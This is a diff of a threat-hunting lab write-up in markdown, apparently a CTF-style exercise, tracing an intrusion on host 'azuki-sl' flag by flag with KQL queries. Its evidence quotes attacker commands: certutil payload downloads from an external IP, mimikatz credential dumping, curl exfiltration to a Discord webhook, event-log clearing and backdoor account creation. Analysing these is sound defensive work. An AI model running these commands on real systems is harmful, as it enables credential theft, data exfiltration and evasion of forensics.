@@ -19,9 +19,9 @@ In the month of Novermber 2025 , Azuki Import/Export Trading Co has been targett
 | **2025-11-18T22:44:11Z** | Flag 1   | Initial Remote Access via RDP                | Inbound Remote IP 88.97.178.12                          |
 | **2025-11-18T22:44:11Z** | Flag 2   | Compromised User Account                     | `kenji.sato`                                            |
 | **2025-11-19T01:04:05Z** | Flag 3   | Enumerating network topology                 | `ARP.EXE -a` Command Executed                           |
-| **2025-11-19T18:37:40Z** | Flag 18  | Malicious Script Method                      | `wupdate.ps1` Downloaded Externally for Execution       |
 | **2025-11-19T18:49:27Z** | Flag 6   | Folder Excluded for Evasion                  | `C:\Users\KENJI~1.SAT\AppData\Local\Temp`               |
 | **2025-11-19T18:49:29Z** | Flag 5   | File Extension Excluding for Evasion         | RegistryValueName's `.bat, .ps1, .exe` Excluded         |
+| **2025-11-19T18:49:48Z** | Flag 18  | Malicious Script Method                      | `wupdate.ps1` Downloaded Externally for Execution       |
 | **2025-11-19T19:05:33Z** | Flag 4   | Malware Staging Directory Created            | `C:\ProgramData\WindowsCache`                           |
 | **2025-11-19T19:07:21Z** | Flag 7   | Download Binary Abuse                        | `certutil.exe` for Fetching Downloads                   |
 | **2025-11-19T19:07:22Z** | Flag 12  | Credential Dumping Tool Usage                | `mm.exe`                                                |
@@ -249,11 +249,11 @@ DeviceRegistryEvents
 
 🚩 **Flag 7 – DEFENCE EVASION - Download Utility Abuse**  
 🎯 **Objective:** Identify legitimate system utilities used to download malware.  
-📌 **Finding (answer):** certutil.exe 
+📌 **Finding (answer):** `certutil.exe` 
 🔍 **Evidence:**  
 - **Host:** "azuki-sl"  
 - **Timestamps:** 2025-11-19T19:07:21.0804181Z  
-- **Process:** `certutil.exe`  
+- **Process:** "certutil.exe"  
 - **CommandLines:**  
   - `"certutil.exe" -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe`  
   - `"certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe`  
@@ -329,7 +329,7 @@ DeviceProcessEvents
 🎯 **Objective:** Identify the IP address of the command and control server.  
 📌 **Finding (answer):** Unusual outbound connection → **78.141.196.6**  
 🔍 **Evidence:**  
-- **Host:** "azuki-sl" · **ActionType:** ConnectionSuccess  
+- **Host:** "azuki-sl" | **ActionType:** "ConnectionSuccess"  
 - **Timestamp:** 2025-11-19T19:11:04.1766386Z <br/>
 💡 **Why it matters:** Identifying C2 servers enables network blocking and infrastructure tracking. <br/>
 
@@ -347,139 +347,267 @@ DeviceNetworkEvents
 
 ---
 
-🚩 **Flag 11 – Persistence via Local Scripting**  
-🎯 **Objective:** Verify if unauthorized persistence was established via legacy tooling.  
-📌 **Finding (answer):** File name tied to Run‑key value = **OnboardTracker.ps1**  
+🚩 **Flag 11 – COMMAND & CONTROL - C2 Communication Port**  
+🎯 **Objective:** Identify the destination port used for command and control communications.  
+📌 **Finding (answer):** Port 443   
 🔍 **Evidence:**  
-- **Host:** nathan-iel-vm  
-- **Timestamp:** 2025-07-18T15:50:36Z  
-- **Registry:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`  
-- **Value Name:** `HRToolTracker` → **C:\HRTools\LegacyAutomation\OnboardTracker.ps1**  
-- **Initiating Process:** PowerShell `New-ItemProperty ... -Force`  
-💡 **Why it matters:** Ensures re‑execution at logon; disguised as HR “Onboarding” tool.
+- **Host:** "azuki-sl"  
+- **Timestamp:** 2025-11-19T19:11:04.1766386Z
+- **RemoteIP:** 78.141.196.6
+- **InitiatingProcessRemoteSessionIP:** 192.168.1.45<br/>
+💡 **Why it matters:** This information supports network detection rules and threat intelligence correlation..<br/>
+
 **KQL Query Used:**
 ```
-DeviceRegistryEvents
-| where Timestamp between (datetime(2025-07-18) .. datetime(2025-07-31))
-| where DeviceName contains "nathan-iel-vm"
-| where InitiatingProcessCommandLine contains "-c"
-| project Timestamp, DeviceName, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessCommandLine
-```
-<img width="1643" height="231" alt="Screenshot 2025-08-17 222159" src="https://github.com/user-attachments/assets/2b76f134-956d-448c-8c57-c8c55a5bfc73" />
+DeviceNetworkEvents
+| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
+| where InitiatingProcessFolderPath contains "C:\\ProgramData\\WindowsCache\\svchost.exe"
+| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, LocalIP, Protocol, RemoteIPType, InitiatingProcessParentFileName, InitiatingProcessRemoteSessionDeviceName, InitiatingProcessRemoteSessionIP
 
----
-
-🚩 **Flag 12 – Targeted File Reuse / Access**  
-🎯 **Objective:** Surface the document that stood out in the attack sequence.  
-📌 **Finding (answer):** **Carlos Tanaka**  
-🔍 **Evidence:**  
-- **Host:** nathan-iel-vm  
-- **Repeated Access:** `Carlos.Tanaka-Evaluation.lnk` (count = 3) within HR artifacts list  
-💡 **Why it matters:** Personnel record of focus; aligns with promotion‑manipulation motive.
-**KQL Query Used:**
 ```
-DeviceEvents
-| where Timestamp between (datetime(2025-07-18) .. datetime(2025-07-31))
-| where DeviceName contains "nathan-iel-vm"
-| summarize Count = count() by FileName
-| sort by Count desc
-```
-<img width="434" height="767" alt="Screenshot 2025-08-17 222304" src="https://github.com/user-attachments/assets/273f916d-e5fe-40dc-924f-802f9724ebc7" />
-
+<img width="1133" height="634" alt="Flag10" src="https://github.com/user-attachments/assets/c09f2478-a116-47ce-8734-7990d5035038" />
 
 
 ---
 
-🚩 **Flag 13 – Candidate List Manipulation**  
-🎯 **Objective:** Trace tampering with promotion‑related data.  
-📌 **Finding (answer):** **SHA1 = 65a5195e9a36b6ce73fdb40d744e0a97f0aa1d34**  
+🚩 **Flag 12 – CREDENTIAL ACCESS - Credential Theft Tool**  
+🎯 **Objective:** Identify the filename of the credential dumping tool.  
+📌 **Finding (answer):** `mm.exe`  
 🔍 **Evidence:**  
-- **File:** `PromotionCandidates.csv`  
-- **Host:** nathan-iel-vm  
-- **Timestamp:** 2025-07-18 16:14:36 (first **FileModified**)  
-- **Path:** `C:\HRTools\PromotionCandidates.csv`  
-- **Initiating:** `"NOTEPAD.EXE" C:\HRTools\PromotionCandidates.csv`  
-💡 **Why it matters:** Confirms direct manipulation of structured HR data driving promotion decisions.
-**KQL Query Used:**
-```
-DeviceFileEvents
-| where Timestamp between (datetime(2025-07-18) .. datetime(2025-07-31))
-| where DeviceName contains "nathan-iel-vm"
-| where FolderPath contains "HR"
-| summarize Count = count() by FileName
-| sort by Count desc
-
-```
-<img width="495" height="468" alt="Screenshot 2025-08-17 223219" src="https://github.com/user-attachments/assets/ce206008-93b6-48c1-a99c-2868db039031" />
+- **Host:** "azuki-sl"
+- **ActionType:** "FileCreated"
+- **InitiatingProcessFileName:** "certitil.exe"
+- **InitiatingProcessCommandLine:** `"certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe`<br/>
+💡 **Why it matters:** Identifies exactly the filename and location to prevent the pivot point of a simple contained compromise to a full environment takeover. <br/>
 
 **KQL Query Used:**
 ```
 DeviceFileEvents
-| where Timestamp between (datetime(2025-07-18) .. datetime(2025-07-31))
-| where DeviceName contains "nathan-iel-vm"
-| where FileName == "PromotionCandidates.csv"
-| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA1, InitiatingProcessCommandLine
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z)) 
+| where FolderPath startswith "C:\\ProgramData\\WindowsCache"
+| sort by Timestamp desc
+| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessRemoteSessionIP
 
 ```
-<img width="1880" height="433" alt="Screenshot 2025-08-17 223349" src="https://github.com/user-attachments/assets/f31b2be7-75d2-4dac-b491-8006c9f342b4" />
+
+<img width="1134" height="630" alt="Flag12" src="https://github.com/user-attachments/assets/fa563fc4-0206-4ee1-bd5e-3166090de5d7" />
+
 
 
 ---
 
-🚩 **Flag 14 – Audit Trail Disruption**  
-🎯 **Objective:** Detect attempts to impair system forensics.  
-📌 **Finding (answer):** **2025-07-19T05:38:55.6800388Z** (first log‑clear attempt)  
+🚩 **Flag 13 – CREDENTIAL ACCESS - Memory Extraction Module**  
+🎯 **Objective:**  Identify the module used to extract logon passwords from memory.<br/>
+📌 **Finding (answer):** `sekurlsa::logonpasswords` <br/>
 🔍 **Evidence:**  
-- **Host:** nathan-iel-vm  
-- **Process:** `wevtutil.exe`  
-- **Command:** `"wevtutil.exe" cl Security` (+ additional clears shortly after)  
-- **SHA256:** `0b732d9ad576d1400db44edf3e750849ac481e9bbaa628a3914e5eef9b7181b0`  
-💡 **Why it matters:** Clear Windows Event Logs → destroys historical telemetry; classic anti‑forensics.
+- **Host:** "azuki-sl" 
+- **Timestamp:** 2025-11-19T19:08:26.2804285Z
+- **FileName:** `mm.exe`
+- **ProcessVersionInfoOriginalFileName:** "mimikatz.exe"
+- **ProcessCommandLine:** `"mm.exe" privilege::debug sekurlsa::logonpasswords exit`<br/>
+💡 **Why it matters:**  Documenting the exact technique used with credential theft tools aids in detection engineering.<br/>
+
 **KQL Query Used:**
 ```
 DeviceProcessEvents
-| where Timestamp between (datetime(2025-07-18) .. datetime(2025-07-31))
-| where DeviceName contains "nathan-iel-vm"
-| where ProcessCommandLine contains "wevtutil"
-| project Timestamp, DeviceName, FileName, ProcessCommandLine, ProcessCreationTime,InitiatingProcessCommandLine , InitiatingProcessCreationTime, SHA256
+| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
+| where DeviceName has_any ("azuki-sl")
+| where FileName contains "mm.exe
+
 ```
-<img width="1263" height="773" alt="Screenshot 2025-08-17 223624" src="https://github.com/user-attachments/assets/af5db852-e1c5-4ff3-8919-aef0a6baa225" />
-
-
+<img width="842" height="431" alt="Flag13" src="https://github.com/user-attachments/assets/7fae08c6-cd0d-466b-bdd1-c4e1a520419c" />
 
 ---
 
-🚩 **Flag 15 – Final Cleanup and Exit Prep**  
-🎯 **Objective:** Capture the combination of anti‑forensics actions signaling attacker exit.  
-📌 **Finding (answer):** **2025-07-19T06:18:38.6841044Z**  
-🔍 **Evidence:**  
-- **File:** `EmptySysmonConfig.xml`  
-- **Path:** `C:\Temp\EmptySysmonConfig.xml`  
-- **Host:** nathan-iel-vm · **Initiating:** powershell.exe  
-💡 **Why it matters:** Blinds Sysmon to suppress detection just prior to exit; ties off anti‑forensics chain.
-
-🚩 **Flag 10 – COMMAND & CONTROL - C2 Server Address**  
-🎯 **Objective:** Identify the IP address of the command and control server.  
-📌 **Finding (answer):** Last unusual outbound connection → **78.141.196.6**  
-🔍 **Evidence:**  
-- **Host:** nathan-iel-vm · **ActionType:** ConnectionSuccess  
-- **RemoteUrl:** `eo7j1sn715wkekj.m.pipedream.net`  
-- **Sequence:** 52.55.234.111 → **52.54.13.125** (last at 2025-07-18T15:28:44Z)  
-💡 **Why it matters:** Validates egress path to external service consistent with data staging/exfil.
+🚩 **Flag 14 – COLLECTION - Data Staging Archive**  
+🎯 **Objective:** Identify the compressed archive filename used for data exfiltration.  
+📌 **Finding (answer):** `export-data.zip`<br/>
+🔍 **Evidence:**  <br/>
+- **Host:** "azuki-sl"
+- **TimeStamp:** 2025-11-19T19:08:58.0244963Z
+- **ActionType:** "FileCreated"
+- **FolderPath:** `C:\ProgramData\WindowsCache\export-data.zip` <br/>
+💡 **Why it matters:** The archive filename often includes dates or descriptive names for the attacker's organisation.<br/>
 
 **KQL Query Used:**
 ```
 DeviceFileEvents
-| where Timestamp between (datetime(2025-07-18) .. datetime(2025-07-31))
-| where DeviceName contains "nathan-iel-vm"
-| where FileName in ("ConsoleHost_history.txt","EmptySysmonConfig.xml","HRConfig.json")
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z)) 
+| where FolderPath startswith "C:\\ProgramData\\WindowsCache"
 | sort by Timestamp desc
-| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine
+
 ```
-<img width="445" height="233" alt="Screenshot 2025-08-17 224226" src="https://github.com/user-attachments/assets/6334babb-6839-4281-b025-74346f5623e9" />
+<img width="1115" height="626" alt="Flag14" src="https://github.com/user-attachments/assets/c11d82df-0e97-42e5-844c-d732bbf40de2" />
 
 
 ---
+
+🚩 **Flag 15 – EXFILTRATION - Exfiltration Channel**  
+🎯 **Objective:** Identify the cloud service used to exfiltrate stolen data.  
+📌 **Finding (answer):** `discord`  
+🔍 **Evidence:**  
+- **Timestamp:** 2025-11-19T19:09:21.4234133Z
+- **Host:** "azuki-sl" · **ActionType:** "ConnectionSuccess" 
+- **RemoteUrl:** "discord.com" | **RemotePort:** 443
+- **InitiatingProcessCommandLine:** `"curl.exe" -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/1432247266151891004/Exd_b9386RVgXOgYSMFHpmvP22jpRJrMNaBqymQy8fh98gcsD6Yamn6EIf_kpdpq83_8`<br/>
+💡 **Why it matters:** Identifying the service helps with incident scope determination and potential data recovery.<br/>
+
+**KQL Query Used:**
+```
+DeviceNetworkEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-19T19:07:22.8551193Z) .. datetime(2025-11-22T23:00:00.00Z))
+| where RemotePort in (80, 443)
+| where isnotempty(RemoteUrl)
+| where InitiatingProcessCommandLine contains "export-data"
+| sort by Timestamp desc
+| project Timestamp, RemoteUrl, DeviceName, ActionType, RemoteIP, RemotePort, InitiatingProcessCommandLine
+
+```
+<img width="1134" height="607" alt="Flag15" src="https://github.com/user-attachments/assets/81029a58-2d3f-4bb0-bd0b-ac70e7bc16b3" />
+
+---
+
+
+🚩 **Flag 16 – ANTI-FORENSICS - Log Tampering**  
+🎯 **Objective:** Identify the first Windows event log cleared by the attacker.  
+📌 **Finding (answer):** `Security`  
+🔍 **Evidence:**  
+- **Host:** "azuki-sl"
+- **Timestamp:** 2025-11-19T19:11:39.0934399Z
+- **ActionType:** "ProcessCreated" | **FileName:** "wetutil.exe"
+- **ProcessCommandLine:** `"wetutil.exe" cl Security`<br/>
+💡 **Why it matters:** The order of log clearing can indicate attacker priorities and sophistication.<br/>
+
+**KQL Query Used:**
+```
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
+| where isnotempty(ProcessCommandLine)
+| where ProcessCommandLine contains "wevtutil"
+| project Timestamp, ProcessCommandLine
+| sort by Timestamp desc 
+
+```
+<img width="1135" height="650" alt="Flag16" src="https://github.com/user-attachments/assets/df4c7726-6764-49de-9dc5-377156c0e97e" />
+
+
+---
+
+🚩 **Flag 17 – IMPACT - Persistence Account**  
+🎯 **Objective:** Identify the backdoor account username created by the attacker.  
+📌 **Finding (answer):** `support`  
+🔍 **Evidence:**  
+- **Host:** "azuki-sl"
+- **Timestamp:** 2025-11-19T19:09:48.8977132Z
+- **ActionType:** "ProcessCreated" | **FileName:** "net.exe"
+- **ProcessCommandLine:** `"net.exe" user support ********** /add`<br/>
+💡 **Why it matters:** These hidden admin-level accounts provide the adversay alternative access to future operations.<br/>
+
+**KQL Query Used:**
+```
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
+| where ProcessCommandLine contains "/add"
+| where InitiatingProcessFileName == "powershell.exe"
+| sort by Timestamp desc 
+ 
+
+```
+<img width="1125" height="618" alt="Flag17" src="https://github.com/user-attachments/assets/71c1e4f5-1fe5-47dd-8436-7b4bf9307f5d" />
+
+
+---
+
+🚩 **Flag 18 – EXECUTION - Malicious Script**  
+🎯 **Objective:** Identify the PowerShell script file used to automate the attack chain.  
+📌 **Finding (answer):** `wupdate.ps1`  
+🔍 **Evidence:**  
+- **Host:** "azuki-sl"
+- **Timestamp:** 2025-11-19T18:49:48.7079818Z
+- **ActionType:** "FileCreated" | **FileName:** "wupdate.ps1"
+- **InitiatingProcessCommandLine:** `powershell  -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://78.141.196.6:8080/wupdate.ps1' -OutFile 'C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1' -UseBasicParsing"`<br/>
+💡 **Why it matters:** Identifying the initial attack script reveals the entry point and automation method used in the compromise.<br/>
+
+**KQL Query Used:**
+```
+DeviceFileEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
+| where ActionType == "FileCreated"
+| where InitiatingProcessFileName == "powershell.exe"
+| where InitiatingProcessCommandLine has_any (".bat", ".ps1", ".py", "Invoke-WebRequest")
+| where InitiatingProcessRemoteSessionIP == "192.168.1.45"
+| sort by Timestamp desc
+| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessRemoteSessionDeviceName, InitiatingProcessRemoteSessionIP
+
+```
+<img width="1132" height="651" alt="Flag18" src="https://github.com/user-attachments/assets/85cab871-e929-4c25-978c-17241321610a" />
+
+
+
+---
+
+🚩 **Flag 19 – LATERAL MOVEMENT - Secondary Target**  
+🎯 **Objective:** Identify the IP address targeted for lateral movement.  
+📌 **Finding (answer):** 10.1.0.188 
+🔍 **Evidence:**  
+- **Host:** "azuki-sl"
+- **Timestamp:** 2025-11-19T19:10:37.2625077Z
+- **ActionType:** "ProcessCreated" | **FileName:** "cmdkey.exe" 
+- **ProcessCommandLine's:**
+  `"cmdkey.exe" /list`
+  `"cmdkey.exe" /generic:10.1.0.188 /user:fileadmin /pass:**********`<br/>
+💡 **Why it matters:** Lateral movement targets are selected based on their access to sensitive data or network privileges. Identifying these targets reveals attacker objectives.<br/>
+
+**KQL Query Used:**
+```
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
+| where ProcessCommandLine has_any ("mstsc", "cmdkey")
+| where InitiatingProcessFileName == "powershell.exe"
+| project Timestamp, DeviceName, ActionType, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName
+| sort by Timestamp desc 
+
+```
+<img width="1144" height="640" alt="Flag19" src="https://github.com/user-attachments/assets/ebd26057-e4b1-4fe2-8ce4-cebe717713cf" />
+
+
+---
+
+🚩 **Flag 20 – LATERAL MOVEMENT - Remote Access Tool**  
+🎯 **Objective:** Identify the remote access tool used for lateral movement.  
+📌 **Finding (answer):** `mstsc.exe`  
+🔍 **Evidence:**  
+- **Host:** "azuki-sl"
+- **Timestamp:** 2025-11-19T19:10:41.372526Z
+- **ActionType:** "ProcessCreated" | **FileName:** "mstsc.exe" 
+- **ProcessCommandLine:** `"mstsc.exe" /v:10.1.0.188 `<br/>
+💡 **Why it matters:** Windows native remote access tools are preferred for lateral movements making its harder to detect than custom tools.<br/>
+
+**KQL Query Used:**
+```
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
+| where ProcessCommandLine has_any ("mstsc", "cmdkey")
+| where InitiatingProcessFileName == "powershell.exe"
+| project Timestamp, DeviceName, ActionType, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName
+| sort by Timestamp desc
+
+```
+<img width="1132" height="646" alt="Flag20" src="https://github.com/user-attachments/assets/3213f0a4-a5a7-40c2-9d3a-77988527b60d" />
+
+
+
+---
+
+
 
 ## MITRE ATT&CK (Quick Map)
 - **Execution:** T1059 (PowerShell) – Flags 1–5, 7–8  
